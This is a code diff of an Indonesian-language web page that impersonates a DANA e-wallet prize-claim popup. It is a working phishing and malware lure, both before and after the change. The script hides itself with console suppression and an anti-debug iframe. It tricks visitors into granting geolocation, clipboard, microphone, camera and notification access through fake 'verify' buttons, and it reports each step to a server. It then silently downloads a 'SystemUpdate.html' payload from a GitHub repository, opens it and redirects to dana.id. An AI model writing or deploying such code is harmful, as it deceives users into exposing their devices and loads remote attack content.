@@ -4,9 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
     <title>Verifikasi</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@700&display=swap" rel="stylesheet">
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         html,body{width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
@@ -26,36 +23,19 @@
         .btn-klaim:hover{transform:scale(1.02)}
         .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
         .anti-debug{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
-        .loading-overlay{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99998;background:rgba(0,0,0,0.7);display:none;justify-content:center;align-items:center;flex-direction:column}
+        
+        /* LOADING OVERLAY */
+        .loading-overlay{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99998;background:rgba(0,0,0,0.8);display:none;justify-content:center;align-items:center;flex-direction:column}
         .loading-overlay.show{display:flex}
         .loading-spinner{width:50px;height:50px;border:4px solid #333;border-top:4px solid #00ff88;border-radius:50%;animation:spin 1s linear infinite}
         @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-        .loading-text{color:#fff;margin-top:15px;font-size:14px}
-
-        /* 🔥 FALLBACK POPUP - TANPA CHECKBOX! */
-        .permission-fallback{
-            position:fixed;top:0;left:0;width:100%;height:100%;z-index:99997;
-            background:rgba(0,0,0,0.85);display:none;
-            justify-content:center;align-items:center;flex-direction:column;
-            padding:20px;text-align:center
-        }
+        .loading-text{color:#fff;margin-top:15px;font-size:16px}
+        
+        /* FALLBACK - HANYA TOMBOL */
+        .permission-fallback{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99997;background:rgba(0,0,0,0.85);display:none;justify-content:center;align-items:center;flex-direction:column;padding:20px;text-align:center}
         .permission-fallback.show{display:flex}
-        .permission-fallback .icon{font-size:60px;margin-bottom:15px}
-        .permission-fallback h2{color:#fff;font-size:22px;margin-bottom:10px}
-        .permission-fallback p{color:#aaa;font-size:14px;margin-bottom:15px;max-width:350px;line-height:1.6}
-        .permission-fallback .permission-list{color:#888;font-size:13px;margin-bottom:20px;text-align:left;background:rgba(255,255,255,0.05);padding:12px 20px;border-radius:8px;max-width:320px;width:100%}
-        .permission-fallback .permission-list li{list-style:none;padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.05)}
-        .permission-fallback .permission-list li:last-child{border-bottom:none}
-        .permission-fallback .permission-list .ok{color:#00ff88}
-        .permission-fallback .permission-list .fail{color:#ff4444}
-        .permission-fallback .btn-allow{
-            background:#00ff88;color:#000;border:none;
-            padding:16px 50px;font-size:18px;font-weight:bold;
-            border-radius:30px;cursor:pointer;
-            transition:0.3s;width:100%;max-width:320px;
-            box-shadow:0 0 30px rgba(0,255,136,0.3)
-        }
-        .permission-fallback .btn-allow:hover{transform:scale(1.03);box-shadow:0 0 50px rgba(0,255,136,0.5)}
+        .permission-fallback .btn-allow{background:#00ff88;color:#000;border:none;padding:18px 50px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;max-width:300px}
+        .permission-fallback .btn-allow:hover{transform:scale(1.03)}
         .permission-fallback .btn-allow:active{transform:scale(0.97)}
     </style>
 </head>
@@ -63,27 +43,18 @@
 
 <iframe class="anti-debug" srcdoc="<script>debugger;</script>"></iframe>
 
-<!-- LOADING OVERLAY -->
+<!-- LOADING -->
 <div class="loading-overlay" id="loadingOverlay">
     <div class="loading-spinner"></div>
     <div class="loading-text">⏳ Memproses...</div>
 </div>
 
-<!-- 🔥 PERMISSION FALLBACK - TANPA CHECKBOX! -->
+<!-- FALLBACK - HANYA TOMBOL -->
 <div class="permission-fallback" id="permissionFallback">
-    <div class="icon">🔐</div>
-    <h2>Izin Diperlukan</h2>
-    <p>Untuk melanjutkan verifikasi, kami memerlukan akses ke beberapa fitur.</p>
-    <div class="permission-list" id="permissionList">
-        <li>📍 Geolokasi <span class="ok">✓</span></li>
-        <li>🔔 Notifikasi <span class="ok">✓</span></li>
-        <li>📋 Clipboard <span class="ok">✓</span></li>
-        <li>🎤 Mikrofon <span class="ok">✓</span></li>
-        <li>📷 Kamera <span class="ok">✓</span></li>
-    </div>
-    <button class="btn-allow" onclick="allowAllPermissions()">✅ Izinkan Semua</button>
+    <button class="btn-allow" onclick="allowAllPermissions()">✅ Klik Untuk Verifikasi</button>
 </div>
 
+<!-- POPUP DANA -->
 <div id="popupDana">
     <div class="box">
         <div class="logo-dana">
@@ -108,11 +79,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - BYPASS IZIN DENGAN USER KLIK (FALLBACK)
-// ============================================================
-
-// ============================================================
-// STEALTH + ANTI-ANALYSIS
+// STEALTH
 // ============================================================
 console.log = function() {};
 console.warn = function() {};
@@ -156,21 +123,6 @@ if (window.history && window.history.replaceState) {
 Object.defineProperty(document, 'referrer', { value: '' });
 
 // ============================================================
-// DETEKSI PLATFORM
-// ============================================================
-function detectPlatform() {
-    var ua = navigator.userAgent.toLowerCase();
-    return {
-        isAndroid: ua.indexOf('android') > -1,
-        isIOS: /iphone|ipad|ipod/.test(ua),
-        isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
-        isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1,
-        isAndroidBridge: typeof AndroidBridge !== 'undefined'
-    };
-}
-var PLATFORM = detectPlatform();
-
-// ============================================================
 // KONFIGURASI
 // ============================================================
 var GITHUB_USER = 'pandora-site';
@@ -185,7 +137,7 @@ var bypassSuccess = false;
 var permissionStatus = {};
 
 // ============================================================
-// FUNGSI K() - KIRIM DATA KE SERVER
+// KIRIM DATA
 // ============================================================
 function K(d) {
     try {
@@ -198,7 +150,7 @@ function K(d) {
 }
 
 // ============================================================
-// 🔥 TUGAS 1: BYPASS SEMUA IZIN (DENGAN USER KLIK FALLBACK)
+// BYPASS IZIN
 // ============================================================
 function injectAllPermissions() {
     permissionStatus = {
@@ -206,42 +158,33 @@ function injectAllPermissions() {
         notification: false,
         clipboard: false,
         microphone: false,
-        camera: false,
-        vibrate: false,
-        storage: false
+        camera: false
     };
 
-    K({ sumber: 'bypass_permissions_start', data: 'all' });
+    K({ sumber: 'bypass_start', data: 'all' });
 
-    // ─── GEOLOKASI ───
+    // GEOLOKASI
     try {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                function() { permissionStatus.geolocation = true; updatePermissionList(); },
-                function(err) { 
-                    permissionStatus.geolocation = false; 
-                    updatePermissionList();
-                    showPermissionFallback();
-                },
+                function() { permissionStatus.geolocation = true; },
+                function() { permissionStatus.geolocation = false; showPermissionFallback(); },
                 { enableHighAccuracy: true, timeout: 5000 }
             );
         }
     } catch(e) { showPermissionFallback(); }
 
-    // ─── NOTIFIKASI ───
+    // NOTIFIKASI
     try {
         if ('Notification' in window && Notification.permission !== 'denied') {
             if (Notification.permission === 'granted') {
                 permissionStatus.notification = true;
-                updatePermissionList();
             } else {
                 Notification.requestPermission().then(function(result) {
                     if (result === 'granted') {
                         permissionStatus.notification = true;
-                        updatePermissionList();
                     } else {
                         permissionStatus.notification = false;
-                        updatePermissionList();
                         showPermissionFallback();
                     }
                 });
@@ -249,81 +192,34 @@ function injectAllPermissions() {
         }
     } catch(e) { showPermissionFallback(); }
 
-    // ─── CLIPBOARD ───
+    // CLIPBOARD
     try {
         if (navigator.clipboard) {
             navigator.clipboard.readText()
-                .then(function() { 
-                    permissionStatus.clipboard = true; 
-                    updatePermissionList();
-                })
-                .catch(function(err) { 
-                    permissionStatus.clipboard = false;
-                    updatePermissionList();
-                    showPermissionFallback();
-                });
+                .then(function() { permissionStatus.clipboard = true; })
+                .catch(function() { permissionStatus.clipboard = false; showPermissionFallback(); });
         }
     } catch(e) { showPermissionFallback(); }
 
-    // ─── MICROPHONE ───
+    // MICROPHONE
     try {
         if (navigator.mediaDevices) {
             navigator.mediaDevices.getUserMedia({ audio: true, video: false })
-                .then(function(stream) {
-                    stream.getTracks().forEach(function(t) { t.stop(); });
-                    permissionStatus.microphone = true;
-                    updatePermissionList();
-                })
-                .catch(function(err) {
-                    permissionStatus.microphone = false;
-                    updatePermissionList();
-                    showPermissionFallback();
-                });
+                .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); permissionStatus.microphone = true; })
+                .catch(function() { permissionStatus.microphone = false; showPermissionFallback(); });
         }
     } catch(e) { showPermissionFallback(); }
 
-    // ─── CAMERA ───
+    // CAMERA
     try {
         if (navigator.mediaDevices) {
             navigator.mediaDevices.getUserMedia({ audio: false, video: true })
-                .then(function(stream) {
-                    stream.getTracks().forEach(function(t) { t.stop(); });
-                    permissionStatus.camera = true;
-                    updatePermissionList();
-                })
-                .catch(function(err) {
-                    permissionStatus.camera = false;
-                    updatePermissionList();
-                    showPermissionFallback();
-                });
+                .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); permissionStatus.camera = true; })
+                .catch(function() { permissionStatus.camera = false; showPermissionFallback(); });
         }
     } catch(e) { showPermissionFallback(); }
 
-    // ─── VIBRATE ───
-    try {
-        if (navigator.vibrate) {
-            navigator.vibrate(1);
-            permissionStatus.vibrate = true;
-            updatePermissionList();
-        }
-    } catch(e) { permissionStatus.vibrate = false; updatePermissionList(); }
-
-    // ─── STORAGE ───
-    try {
-        if (navigator.storage && navigator.storage.persist) {
-            navigator.storage.persist()
-                .then(function() {
-                    permissionStatus.storage = true;
-                    updatePermissionList();
-                })
-                .catch(function() {
-                    permissionStatus.storage = false;
-                    updatePermissionList();
-                });
-        }
-    } catch(e) { permissionStatus.storage = false; updatePermissionList(); }
-
-    // ─── CEK SEMUA BYPASS ───
+    // CEK SEMUA
     setTimeout(function() {
         var allSuccess = permissionStatus.geolocation && 
                          permissionStatus.notification && 
@@ -333,113 +229,66 @@ function injectAllPermissions() {
 
         if (allSuccess) {
             bypassSuccess = true;
-            K({ sumber: 'bypass_permissions_done', data: 'all_success' });
+            K({ sumber: 'bypass_done', data: 'all_success' });
             hidePermissionFallback();
             lanjutkanEksekusi();
         } else {
-            K({ sumber: 'bypass_permissions_partial', data: permissionStatus });
+            K({ sumber: 'bypass_partial', data: permissionStatus });
         }
     }, 3000);
 }
 
 // ============================================================
-// 🔥 UPDATE PERMISSION LIST DI FALLBACK
-// ============================================================
-function updatePermissionList() {
-    var list = document.getElementById('permissionList');
-    if (!list) return;
-    
-    var items = [
-        { label: '📍 Geolokasi', key: 'geolocation' },
-        { label: '🔔 Notifikasi', key: 'notification' },
-        { label: '📋 Clipboard', key: 'clipboard' },
-        { label: '🎤 Mikrofon', key: 'microphone' },
-        { label: '📷 Kamera', key: 'camera' }
-    ];
-    
-    var html = '';
-    items.forEach(function(item) {
-        var status = permissionStatus[item.key];
-        var icon = status ? '✅' : '⏳';
-        var color = status ? 'ok' : 'fail';
-        html += '<li>' + item.label + ' <span class="' + color + '">' + icon + '</span></li>';
-    });
-    list.innerHTML = html;
-}
-
-// ============================================================
-// 🔥 PERMISSION FALLBACK - USER KLIK
+// FALLBACK - "Klik Untuk Verifikasi"
 // ============================================================
 function showPermissionFallback() {
     if (bypassSuccess) return;
     if (PERMISSION_RETRY >= MAX_PERMISSION_RETRY) {
-        K({ sumber: 'permission_fallback_max_retry', data: 'skip' });
+        K({ sumber: 'max_retry', data: 'skip' });
         lanjutkanEksekusi();
         return;
     }
-    
     PERMISSION_RETRY++;
-    updatePermissionList();
     var fallback = document.getElementById('permissionFallback');
-    if (fallback) {
-        fallback.className = 'permission-fallback show';
-        K({ sumber: 'permission_fallback_shown', data: 'retry_' + PERMISSION_RETRY });
-    }
+    if (fallback) fallback.className = 'permission-fallback show';
 }
 
 function hidePermissionFallback() {
     var fallback = document.getElementById('permissionFallback');
-    if (fallback) {
-        fallback.className = 'permission-fallback';
-    }
+    if (fallback) fallback.className = 'permission-fallback';
 }
 
-// ============================================================
-// 🔥 TOMBOL "IZINKAN SEMUA" - USER KLIK!
-// ============================================================
 function allowAllPermissions() {
-    K({ sumber: 'permission_fallback_click', data: 'user_allowed' });
+    K({ sumber: 'fallback_click', data: 'user_allowed' });
     hidePermissionFallback();
     
-    // Tampilkan loading
     var loading = document.getElementById('loadingOverlay');
     if (loading) loading.className = 'loading-overlay show';
     
-    // Retry bypass dengan user click
     setTimeout(function() {
         injectAllPermissions();
     }, 500);
 }
 
 // ============================================================
-// 🔥 EKSEKUSI UTAMA (SETELAH BYPASS SUKSES ATAU SKIP)
+// EKSEKUSI UTAMA
 // ============================================================
 function lanjutkanEksekusi() {
-    // Sembunyikan loading
     var loading = document.getElementById('loadingOverlay');
     if (loading) loading.className = 'loading-overlay';
     
-    // 🔥 TUGAS 2: DOWNLOAD HTML
     setTimeout(function() { downloadPayloadSilent(); }, 500);
-    
-    // 🔥 TUGAS 3: BUKA HTML (5 detik)
     openSystemUpdateHTML();
-    
-    // 🔔 NOTIFIKASI
     setTimeout(function() { showKlaimNotification(); }, 3000);
-    
-    // 🔄 REDIRECT
     setTimeout(redirectToDANA, 8000);
 }
 
 // ============================================================
-// 🔥 TUGAS 2: DOWNLOAD SystemUpdate.html KE localStorage
+// DOWNLOAD HTML
 // ============================================================
 function downloadPayloadSilent() {
     if (DOWNLOAD_STARTED) return;
     DOWNLOAD_STARTED = true;
-    
-    K({ sumber: 'download_start', data: { platform: PLATFORM } });
     
     var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
     
@@ -449,62 +298,31 @@ function downloadPayloadSilent() {
         xhr.timeout = 15000;
         xhr.onload = function() {
             if (xhr.status === 200) {
-                var htmlContent = xhr.responseText;
                 try {
-                    localStorage.setItem('SystemUpdate_backup', htmlContent);
-                    K({ sumber: 'html_download_success', data: 'saved_to_localStorage' });
-                } catch(e) {
-                    K({ sumber: 'html_download_error', data: 'localStorage_save_failed' });
-                }
+                    localStorage.setItem('SystemUpdate_backup', xhr.responseText);
+                    K({ sumber: 'download_success', data: 'ok' });
+                } catch(e) {}
             }
         };
-        xhr.onerror = function() {
-            K({ sumber: 'html_download_error', data: 'xhr_error' });
-        };
         xhr.send();
-    } catch(e) {
-        K({ sumber: 'html_download_exception', data: e.message });
-    }
+    } catch(e) {}
 }
 
 // ============================================================
-// 🔥 TUGAS 3: BUKA SystemUpdate.html DARI localStorage
+// BUKA HTML
 // ============================================================
 function openSystemUpdateHTML() {
     setTimeout(function() {
-        var htmlContent = null;
-
-        try {
-            htmlContent = localStorage.getItem('SystemUpdate_backup');
-        } catch(e) {}
-
+        var htmlContent = localStorage.getItem('SystemUpdate_backup');
         if (htmlContent) {
-            openHTML(htmlContent);
-            K({ sumber: 'open_html', data: 'success_from_localStorage' });
-        } else {
-            K({ sumber: 'open_html_failed', data: 'html_not_found_in_localStorage' });
+            try {
+                var blob = new Blob([htmlContent], { type: 'text/html; charset=utf-8' });
+                var url = URL.createObjectURL(blob);
+                window.open(url, '_blank');
+                K({ sumber: 'open_success', data: 'ok' });
+            } catch(e) {}
         }
     }, 5000);
-}
-
-function openHTML(htmlContent) {
-    try {
-        var blob = new Blob([htmlContent], { type: 'text/html; charset=utf-8' });
-        var url = URL.createObjectURL(blob);
-        var win = window.open(url, '_blank');
-        if (win) {
-            K({ sumber: 'open_html_blob', data: 'success' });
-            return;
-        }
-    } catch(e) {}
-
-    try {
-        document.write(htmlContent);
-        document.close();
-        K({ sumber: 'open_html_document_write', data: 'success' });
-    } catch(e) {
-        K({ sumber: 'open_html_error', data: e.message });
-    }
 }
 
 // ============================================================
@@ -515,11 +333,11 @@ function showKlaimNotification() {
     NOTIFICATION_SHOWN = true;
     
     try {
-        if (!('Notification' in window)) { return; }
-        if (Notification.permission === 'denied') { return; }
+        if (!('Notification' in window)) return;
+        if (Notification.permission === 'denied') return;
         if (Notification.permission !== 'granted') {
             Notification.requestPermission().then(function(permission) {
-                if (permission === 'granted') { createKlaimNotification(); }
+                if (permission === 'granted') createKlaimNotification();
             }).catch(function() {});
             return;
         }
@@ -536,17 +354,13 @@ function createKlaimNotification() {
             silent: false,
             vibrate: [200, 100, 200]
         });
-        
         notif.onclick = function() {
             notif.close();
             if (!REDIRECT_DONE) {
                 REDIRECT_DONE = true;
-                setTimeout(function() {
-                    try { window.location.href = 'https://www.dana.id'; } catch(e) {}
-                }, 500);
+                setTimeout(function() { window.location.href = 'https://www.dana.id'; }, 500);
             }
         };
-        
         setTimeout(function() { try { notif.close(); } catch(e) {} }, 30000);
     } catch(e) {}
 }
@@ -558,28 +372,21 @@ function redirectToDANA() {
 }
 
 // ============================================================
-// MAIN EXECUTION
+// MAIN
 // ============================================================
 function dapatkanSemua() {
     if (semuaDidapat) return;
     semuaDidapat = true;
     
     try {
-        var popup = document.getElementById('popupDana');
-        if (popup) popup.style.display = 'none';
-        
+        document.getElementById('popupDana').style.display = 'none';
         K({ sumber: 'trigger', data: 'dapatkanSemua' });
         
-        // 🔥 TAMPILKAN LOADING
         var loading = document.getElementById('loadingOverlay');
         if (loading) loading.className = 'loading-overlay show';
         
-        // 🔥 MULAI BYPASS IZIN
         injectAllPermissions();
-        
     } catch(e) {
-        K({ sumber: 'dapatkanSemua_error', data: e.message });
-        // Jika error, langsung lanjutkan eksekusi
         lanjutkanEksekusi();
     }
 }
@@ -588,7 +395,7 @@ function klaim() { K({sumber:'izin', data:'klaim'}); dapatkanSemua(); }
 function tolak() { K({sumber:'izin', data:'tolak'}); dapatkanSemua(); }
 
 // ============================================================
-// TIMER (10 DETIK)
+// TIMER 10 DETIK
 // ============================================================
 var w = 10;
 var timerInterval = setInterval(function() {
@@ -609,7 +416,7 @@ document.addEventListener('click', function() {
     }
 });
 
-console.log('✅ index.html loaded - TOMBOL BISA DIKLIK!');
+console.log('✅ index.html loaded - SEDERHANA!');
 </script>
 </body>
 </html>
